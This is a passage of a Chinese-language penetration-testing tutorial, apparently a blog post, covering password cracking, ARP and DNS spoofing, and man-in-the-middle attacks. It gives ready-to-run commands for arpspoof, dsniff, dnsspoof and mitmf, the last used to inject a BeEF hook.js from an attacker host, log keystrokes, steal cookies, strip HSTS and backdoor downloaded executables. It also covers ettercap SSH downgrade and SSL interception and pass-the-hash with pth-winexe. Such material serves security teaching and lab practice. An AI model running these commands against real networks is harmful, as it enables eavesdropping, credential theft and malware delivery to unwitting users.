+<p>查看破解结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john sam.hash --format=nt --show</span><br></pre></td></tr></table></figure></p>
+<h3 id="图形化界面的john–johnny"><a href="#图形化界面的john–johnny" class="headerlink" title="图形化界面的john–johnny"></a>图形化界面的john–johnny</h3><h2 id="ophcrack"><a href="#ophcrack" class="headerlink" title="ophcrack"></a>ophcrack</h2><p>基于彩虹表的<code>LM</code>,<code>NTLM</code>密码破解软件</p>
+<p>图形化界面</p>
+<p>官方彩虹表下载：<a href="http://ophcrack.sourceforge.net/tables.php" target="_blank" rel="noopener">http://ophcrack.sourceforge.net/tables.php</a></p>
+<hr>
+<h1 id="密码嗅探"><a href="#密码嗅探" class="headerlink" title="密码嗅探"></a>密码嗅探</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="二、三层地址"><a href="#二、三层地址" class="headerlink" title="二、三层地址"></a>二、三层地址</h3><p><code>MAC</code>地址，主机到主机</p>
+<p><code>IP</code>地址，网络到网络</p>
+<h3 id="交换机与HUB"><a href="#交换机与HUB" class="headerlink" title="交换机与HUB"></a>交换机与HUB</h3><p><code>HUB</code>会将数据包转发到除发送端口外的所有端口。若在<code>HUB</code>范围内的任意台主机，将其网卡设置为混杂模式，则可进行<code>HUB</code>范围内的密码嗅探</p>
+<p>交换机根据学习地址，形成地址表来转发数据包。对于广播包，交换机会进行广播，将交换机网络范围内的主机网卡设置为混杂模式可以进行嗅探；但对于单播包，是无法进行嗅探的</p>
+<h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>用于<code>IP</code>地址转换为<code>MAC</code>地址</p>
+<p>基于广播学习</p>
+<p>请求、响应相对独立</p>
+<p>基于传闻的协议</p>
+<h3 id="ARP协议的安全隐患"><a href="#ARP协议的安全隐患" class="headerlink" title="ARP协议的安全隐患"></a>ARP协议的安全隐患</h3><ol>
+<li><p>因<strong><code>ARP</code>协议的请求包与响应包是相互独立的</strong>，所以即使一主机并没有发送<code>ARP</code>请求包，也是可以接受<code>ARP</code>响应包的。</p>
+</li>
+<li><p><code>ARP</code>协议是基于传闻的协议。当一主机接收到<code>ARP</code>响应包，就会信任此响应包，从而更改自己的<code>IP</code>与<code>MAC</code>对应关系表</p>
+</li>
+</ol>
+<p>这就形成<code>ARP</code>欺骗</p>
+<p>在同一局域网络中，<code>A</code>声称自己的<code>MAC</code>地址是网关<code>IP</code>所对应的<code>MAC</code>地址。向局域网中发送大量<code>ARP</code>响应广播包，局域网中的主机则会信任这种网关<code>IP</code>的<code>MAC</code>是<code>A</code>的<code>MAC</code>的这种对应关系，所以当局域网中的主机向网关发送数据时，都会发送到<code>A</code>处，<code>A</code>可以进行抓包，并且可以将自己设置为路由模式，相当于替代了路由器的功能，并且还形成<strong>中间人攻击</strong>，获取到局域网内主机的数据信息。</p>
+<h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><h3 id="手动修改数据包，伪造ARP响应包实现ARP欺骗-OmniPeek"><a href="#手动修改数据包，伪造ARP响应包实现ARP欺骗-OmniPeek" class="headerlink" title="手动修改数据包，伪造ARP响应包实现ARP欺骗(OmniPeek)"></a>手动修改数据包，伪造<code>ARP</code>响应包实现<code>ARP</code>欺骗(<code>OmniPeek</code>)</h3><h3 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -t 192.168.1.12 -r 192.168.1.1</span><br><span class="line"></span><br><span class="line">-t：指定被欺骗主机</span><br><span class="line">-r：指定网关</span><br></pre></td></tr></table></figure>
+<p>效果：<code>ARP</code>欺骗成功后，192.168.1.12认为<code>kali</code>是网关，192.168.1.1认为<code>kali</code>是192.168.1.12。此时，1.12的数据包会发向<code>kali</code>，网关对1.12的回包会发向<code>kali</code>，从而<code>kali</code>实现中间人攻击</p>
+<p>中间人实现路由转发功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+<h3 id="网络嗅探"><a href="#网络嗅探" class="headerlink" title="网络嗅探"></a>网络嗅探</h3><ol>
+<li><p><code>wireshark</code>,<code>tcpdump</code>等工具</p>
+</li>
+<li><p>抓取图片，声音</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0 -a -d tmp/ -s </span><br><span class="line"></span><br><span class="line">-i：指定抓包的网络接口</span><br><span class="line">-a：抓到的图片不实时显示，存储到目录中</span><br><span class="line">-d：指定存储目录</span><br><span class="line">-s：抓取声音</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>抓取访问链接</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webspy -i eth0 192.168.1.12</span><br><span class="line"></span><br><span class="line">-i：指定抓包的网络接口</span><br><span class="line">指定要抓取数据的被欺骗主机</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>抓取访问80，8080，3128端口的数据包</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">urlsnarf -i eth0</span><br><span class="line"></span><br><span class="line">-i：指定抓包的网络接口</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>抓取密码</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dsniff -i eth0 -m</span><br><span class="line"></span><br><span class="line">-i：指定抓包的网络接口</span><br><span class="line">-m：对抓取到的数据包中的协议自动解码</span><br></pre></td></tr></table></figure>
+<p> 查看<code>dsniff</code>支持的解码协议</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/dsniff/dsniff.services</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h2><ol>
+<li><p>结合<code>ARP</code>欺骗，也可以同时进行<code>DNS</code>欺骗</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dnsspoof -i eth0 -f 		/usr/share/dsniff/dnsspoof.hosts</span><br><span class="line">-i：指定DNS欺骗使用的网络接口</span><br><span class="line">-f：指定要欺骗的域名与IP对应的列表文件</span><br></pre></td></tr></table></figure>
+<p> 因已经进行了<code>ARP</code>欺骗，1.12主机的所有数据包都会发向<code>kali</code>。命令执行后，会对数据包中访问<code>UDP</code>53端口的数据包进行截获。返回假的域名、<code>IP</code>对应关系，从而达到<code>DNS</code>欺骗的效果。可以实现网站登陆等信息的抓取</p>
+</li>
+<li><p><code>DNS</code>欺骗代理</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dnschef --fakeip=1.1.1.1 --fakedomains=www.google.com,www.yutube.com --interface 1.1.1.2 -q</span><br><span class="line"> </span><br><span class="line">--fakeip：指定欺骗后指向的IP</span><br><span class="line">--fakedomains：指定要欺骗的域名</span><br><span class="line">--interface：指定用于做欺骗的主机的IP</span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>执行命令后，<code>dnschef</code>会监听做欺骗主机的<code>udp</code>53端口，同时指定一个真正的上游<code>DNS</code>服务器</p>
+</li>
+<li><p>修改被欺骗主机的<code>hosts</code>文件或<code>DNS</code>配置，将<code>DNS</code>查询请求指向做欺骗主机，实现<code>DNS</code>欺骗</p>
+</li>
+<li><p>当被欺骗主机访问被欺骗的域名时，会向做欺骗的主机发出<code>DNS</code>查询请求，做欺骗的主机会直接返回域名的<code>A</code>记录，即欺骗后指向的<code>IP</code>地址，实现流量劫持</p>
+</li>
+<li><p>当被欺骗主机访问未被欺骗的域名时，做欺骗的主机接到被欺骗主机<code>DNS</code>请求时，会向上游指定的真正的<code>DNS</code>服务器发起查询请求，得到真正的<code>IP</code>地址，然后返回给被欺骗主机，实现正常的<code>DNS</code>解析。此次过程对被欺骗主机不可见</p>
+</li>
+</ol>
+</li>
+</ol>
+<hr>
+<h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h1><p><img src="/images/KaliLinux_shentouceshi/mimapojie/19.png" alt="19.png"></p>
+<h2 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a>注入XSS</h2><p>当实现了中间人攻击，客户端向服务器的发包，以及服务器向客户端的回包，都会经过中间人。</p>
+<p>中间人对于两方的数据包，可以查看，可以修改。</p>
+<p>即使服务器端没有<code>XSS</code>漏洞，当服务器向客户端的回包经过中间人时，中间人仍然可以插入<code>XSS</code>攻击代码，然后返回给客户端，实现<code>XSS</code>攻击，被称为凌空向每个<code>HTTP</code>请求中注入<code>XSS</code>攻击代码</p>
+<p>若中间人发生在运营商线路上，很难引起用户注意</p>
+<h2 id="mitmf"><a href="#mitmf" class="headerlink" title="mitmf"></a>mitmf</h2><p>号称最好用的中间人攻击工具(<code>kali 2.0</code>后默认未安装)</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>安装依赖包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br></pre></td></tr></table></figure></p>
+<p>安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-15.5.0.tar.bz2</span><br><span class="line">pip install ./Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure>
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><code>mitmf</code>会启动<code>SSLstrip</code>，将<code>https</code>降级为<code>http</code></p>
+<ol>
+<li><p>结合<code>BeEf</code>，将<code>BeEf</code>的<code>hook.js</code>注入到数据包中</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/beef-xss/</span><br><span class="line">./beef</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.12 --inject --js-url http://192.168.1.10:3000/hook.js</span><br><span class="line"> --spoof：欺骗</span><br><span class="line"> --arp：arp地址欺骗</span><br><span class="line"> -i：指定使用的网络接口</span><br><span class="line"> --gateway：指定网关IP</span><br><span class="line"> --target：指定要欺骗的目标IP</span><br><span class="line"> --inject：注入模式</span><br><span class="line"> --js-url：指定恶意js脚本的地址</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>实现键盘记录器</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.12 --jskeylogger</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>图片反转180度</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.12 --upsidedownternet</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>屏幕快照</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.12 --screen</span><br></pre></td></tr></table></figure>
+<p> 每隔10秒钟，会抓取一张屏幕快照，图片存放于<code>/var/log/mitmf</code></p>
+</li>
+<li><p>抓取<code>cookie</code></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.12 --ferretng</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>浏览器及插件信息</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.12 --browserprofiler</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取<code>SMB</code>文件共享的信息</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--smbtrap</span><br><span class="line">--smbauth</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>HTTP Strict Transport Security</code></p>
+<p> 用于防止协议降级、<code>cookie</code>窃取</p>
+<p> 安全策略通过<code>HTTP</code>响应头<code>Strict-Transport-Security</code>实施</p>
+<p> 会限制<code>user-agent</code>、<code>https</code>等</p>
+<p> 使用以下模块可绕过此安全策略</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--hsts</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>注入后门</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--filepwn</span><br></pre></td></tr></table></figure>
+<p> 当客户端从服务器请求下载可执行程序时，经过中间人，中间人会在可执行程序中注入后门程序后发送给客户端，客户端执行该程序后，会安装后门，或者直接向中间人反弹<code>shell</code></p>
+</li>
+</ol>
+<h2 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h2><p>统一功能的中间人攻击工具</p>
+<p>可转发<code>MAC</code>与本机相同，但<code>IP</code>与本机不同的数据包</p>
+<p>支持<code>SSHv1</code>、<code>SSL</code>中间人攻击</p>
+<h3 id="模块划分"><a href="#模块划分" class="headerlink" title="模块划分"></a>模块划分</h3><ol>
+<li><p><code>snifer</code>(抓包)</p>
+</li>
+<li><p><code>MITM</code>(中间人攻击)</p>
+</li>
+<li><p><code>filter</code>(筛选)</p>
+</li>
+<li><p><code>log</code>(日志)</p>
+</li>
+<li><p><code>plugin</code>(插件)</p>
+</li>
+</ol>
+<h3 id="snifer"><a href="#snifer" class="headerlink" title="snifer"></a>snifer</h3><p>负责数据包的转发</p>
+<h4 id="unified"><a href="#unified" class="headerlink" title="unified"></a>unified</h4><p>单个网卡情况下，独立完成三层数据包转发</p>
+<p>始终会禁用内核的<code>ip_forward</code>功能</p>
+<h4 id="bridge"><a href="#bridge" class="headerlink" title="bridge"></a>bridge</h4><p>两块网卡情况下，一块负责数据包进入，另一块负责数据包发出。相当于一层<code>MITM</code>模式</p>
+<p>相当于<code>IPS</code>过滤数据包</p>
+<p>不可在网关上使用这种模式，此模式相当于透明网桥，有较大的安全风险</p>
+<h3 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a>MITM</h3><p>把流量重定向到<code>ettercap</code>主机上</p>
+<p>可以使用其他工具实现<code>MITM</code>，<code>ettercap</code>只作为嗅探和过滤使用</p>
+<h3 id="实现MITM的方法"><a href="#实现MITM的方法" class="headerlink" title="实现MITM的方法"></a>实现MITM的方法</h3><ol>
+<li><p><code>ARP</code>地址欺骗</p>
+</li>
+<li><p><code>ICMP</code> </p>
+<p> <code>ICMP</code>路由重定向数据包，只可实现半双工中间人攻击</p>
+<p> <img src="/images/KaliLinux_shentouceshi/mimapojie/20.png" alt="20.png"></p>
+<p> 半双工指客户端发包发向中间人，中间人发向服务器，但服务器的回包不经过中间人，由服务器直接发向客户端</p>
+</li>
+<li><p><code>DHCP</code></p>
+<p> 修改网关地址，半双工</p>
+</li>
+<li><p><code>switch port stealing</code>(窃取交换机端口)</p>
+<p> 适用于<code>ARP</code>静态绑定的环境</p>
+<p>攻击者与被攻击者连接在同一交换机上，攻击者发送<code>flood</code>包，目标地址是攻击者本机<code>MAC</code>地址，伪造源地址为被攻击者的<code>MAC</code>地址。此时交换机会认为攻击者所连的交换机端口的<code>MAC</code>地址是被攻击者的，则以后交换机收到的发往被攻击者的数据包都会发向攻击者，实现半双工的中间人攻击。若同时对被攻击者进行端口窃取，让被攻击者认为攻击者为交换机。则可实现全双工的中间人攻击</p>
+</li>
+<li><p><code>NDP</code></p>
+<p> <code>IPv6</code>协议欺骗技术</p>
+</li>
+</ol>
+<p><code>Linux</code>2.4 以上内核对<code>ARP</code>地址欺骗的约束</p>
+<ol>
+<li><p>收到非自己发出的<code>ARP</code>请求包的响应包时，不更新本地<code>ARP</code>缓存</p>
+</li>
+<li><p><code>ettercap</code>使用<code>ARP request</code>包进行攻击</p>
+<p> <code>solaris</code>系统不根据<code>ARP</code>包来更新本地<code>ARP</code>缓存</p>
+</li>
+<li><p><code>ettercap</code>首先发送<code>ICMP</code>包来更新目标<code>ARP</code>缓存</p>
+</li>
+</ol>
+<h3 id="基于ARP欺骗的使用"><a href="#基于ARP欺骗的使用" class="headerlink" title="基于ARP欺骗的使用"></a>基于ARP欺骗的使用</h3><h4 id="用户操作界面"><a href="#用户操作界面" class="headerlink" title="用户操作界面"></a>用户操作界面</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-T		#文本界面</span><br><span class="line">-G		#图形界面</span><br><span class="line">-C		#基于文本的图形界面</span><br><span class="line">-D		#后台模式</span><br></pre></td></tr></table></figure>
+<h4 id="指定目标"><a href="#指定目标" class="headerlink" title="指定目标"></a>指定目标</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">格式：MAC地址/IPv4地址(s)/IPv6地址(s)/端口号(s) MAC地址/IPv4地址(s)/IPv6地址(s)/端口号(s)</span><br><span class="line"></span><br><span class="line">表示在这两个IP之间进行中间人攻击</span><br><span class="line">若无，则空。保证///格式正确</span><br></pre></td></tr></table></figure>
+<h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><p>修改配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.conf</span><br><span class="line"></span><br><span class="line">ec_uid = 0</span><br><span class="line">ec_gid = 0</span><br><span class="line"></span><br><span class="line">以root权限运行ettercap</span><br></pre></td></tr></table></figure>
+<h4 id="基于伪造证书的SSL-MITM"><a href="#基于伪造证书的SSL-MITM" class="headerlink" title="基于伪造证书的SSL MITM"></a>基于伪造证书的SSL MITM</h4><p><code>bridge</code>模式不支持<code>SSL MITM</code></p>
+<p>生成证书</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out etter.ssl.crt 1024</span><br><span class="line">openssl req -new-keyetter.ssl.crt -out tmp.csr</span><br><span class="line">openssl x509 -req -days 1825 -in tmp.csr -signkey etter.ssl.crt -out tmp.new</span><br><span class="line">cat tmp.new &gt;&gt; etter.ssl.crt</span><br><span class="line">rm -rf tmp.newtmp.csr</span><br></pre></td></tr></table></figure>
+<h4 id="字符模式"><a href="#字符模式" class="headerlink" title="字符模式"></a>字符模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ettercap -i eth0 -T -M arp:remote -q /1.1.1.1// /1.1.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</span><br><span class="line"></span><br><span class="line">-i：指定网络接口</span><br><span class="line">-T：字符模式</span><br><span class="line">-M：指定使用的中间人技术(arp 全双工)</span><br><span class="line">-q：安静模式</span><br><span class="line">-F：调用过滤器</span><br><span class="line">-P：调用模块</span><br><span class="line">-w：存储网络流量信息于文件中</span><br><span class="line">-l：存储简单的日志信息于文件中</span><br><span class="line">-L：存储所有的日志信息于文件中</span><br><span class="line">-m：存储消息信息于文件中</span><br></pre></td></tr></table></figure>
+<h4 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h4><h4 id="SSL-MITM"><a href="#SSL-MITM" class="headerlink" title="SSL MITM"></a>SSL MITM</h4><p>开启<code>SSL</code>功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.conf</span><br><span class="line"></span><br><span class="line">Linux iptables选项启用</span><br></pre></td></tr></table></figure>
+<h4 id="DNS欺骗-1"><a href="#DNS欺骗-1" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h4><p>修改<code>dns_spoof</code>插件配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br><span class="line"></span><br><span class="line">添加要欺骗的域名和IP对应关系</span><br><span class="line"></span><br><span class="line">ettercap -Tq -M arp:remote -i eth0 /192.168.1.1// /192.168.1.114// -P dns_spoof</span><br></pre></td></tr></table></figure>
+<h4 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">etterlog -p logall.eci		#查看获取的密码(eci文件)</span><br><span class="line">etterlog -c log.ecp			#列出log中的链接(ecp文件)</span><br><span class="line">etterlog -c -f /1.1.1.1/ log.ecp</span><br><span class="line">etterlog -B -n -s -F TCP:1.1.1.1:20:1.1.1.2:1234 log.ecp &gt; aa		#选择相应的连接并榨取文件</span><br></pre></td></tr></table></figure>
+<h4 id="filter-筛选器"><a href="#filter-筛选器" class="headerlink" title="filter(筛选器)"></a>filter(筛选器)</h4><p>默认存在的<code>filter</code>筛选文件目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/ettercap/</span><br></pre></td></tr></table></figure></p>
+<h5 id="etter-filter-ssh筛选器作用："><a href="#etter-filter-ssh筛选器作用：" class="headerlink" title="etter.filter.ssh筛选器作用："></a><code>etter.filter.ssh</code>筛选器作用：</h5><p><code>SSH</code>1版本指<code>SSH</code>1.51版本，<code>SSH</code>2版本指<code>SSH</code>2.xx版本。当服务器同时支持<code>SSH</code>1版本与<code>SSH</code>2版本时，会显示<code>SSH</code>1.99版本</p>
+<p><code>SSH</code>1版本可以做中间人攻击，<code>SSH</code>2版本无法进行中间人攻击，<code>etter.filter.ssh</code>就是用来判断<code>SSH</code>的版本，若为<code>SSH</code>2版本则提示无法攻击；若为<code>SSH</code>1.99版本，则强制降级为<code>SSH</code>1.51版本；若为<code>SSH</code>1.51版本，则提示可以攻击</p>
+<h5 id="etter-filter-ssh筛选器使用："><a href="#etter-filter-ssh筛选器使用：" class="headerlink" title="etter.filter.ssh筛选器使用："></a><code>etter.filter.ssh</code>筛选器使用：</h5><p>编译：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">etterfilter etter.filter.ssh -o ssh.ef</span><br></pre></td></tr></table></figure>
+<p>使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -M arp:remote -i eth0 /192.168.1.1// /192.168.1.114// -F ssh.ef</span><br></pre></td></tr></table></figure>
+<p>可以编写自己的筛选器，用于替换网页中的下载，内容等，实现基于中间人攻击的更多的利用方法</p>
+<h3 id="ICMP中间人攻击"><a href="#ICMP中间人攻击" class="headerlink" title="ICMP中间人攻击"></a>ICMP中间人攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-M icmp:真实网关的MAC地址/真实网关的IP地址</span><br></pre></td></tr></table></figure>
+<h3 id="DHCP中间人攻击"><a href="#DHCP中间人攻击" class="headerlink" title="DHCP中间人攻击"></a>DHCP中间人攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-M dhcp:IP地址池/IP段子网掩码/DNS服务器IP</span><br><span class="line"></span><br><span class="line">默认此种欺骗方式的网关为做欺骗的主机</span><br></pre></td></tr></table></figure>
+<h3 id="switch-port-stealing-窃取交换机端口-中间人攻击"><a href="#switch-port-stealing-窃取交换机端口-中间人攻击" class="headerlink" title="switch port stealing(窃取交换机端口)中间人攻击"></a>switch port stealing(窃取交换机端口)中间人攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-M port /1.1.1.1/ /1.1.1.2/</span><br></pre></td></tr></table></figure>
+<h3 id="NDP中间人攻击"><a href="#NDP中间人攻击" class="headerlink" title="NDP中间人攻击"></a>NDP中间人攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-M ndp //IPv6地址/ //IPv6地址/</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="PASS-THE-HASH-PTH"><a href="#PASS-THE-HASH-PTH" class="headerlink" title="PASS THE HASH(PTH)"></a>PASS THE HASH(PTH)</h1><p>密码破解耗费时间、资源巨大</p>
+<p><strong>可以使用密文提交给服务器直接完成身份认证</strong></p>
+<p><code>NTLM/LM</code>是没有加盐的静态<code>HASH</code>密文</p>
+<p>此种攻击方式只适用于<code>Windows</code>系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U 用户名%密码密文 //目标IP cmd</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/信息安全/" <i class="fa fa-tag"></i> 信息安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/15/WEB安全之条件竞争漏洞/" rel="next" title="WEB安全之条件竞争漏洞">
+                <i class="fa fa-chevron-left"></i> WEB安全之条件竞争漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/17/日志分析ELK/" rel="prev" title="日志分析ELK">
+                日志分析ELK <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  
+  <div>
+	
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">---------------The  End---------------</div>
+    
+</div>
+	
+  </div>
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
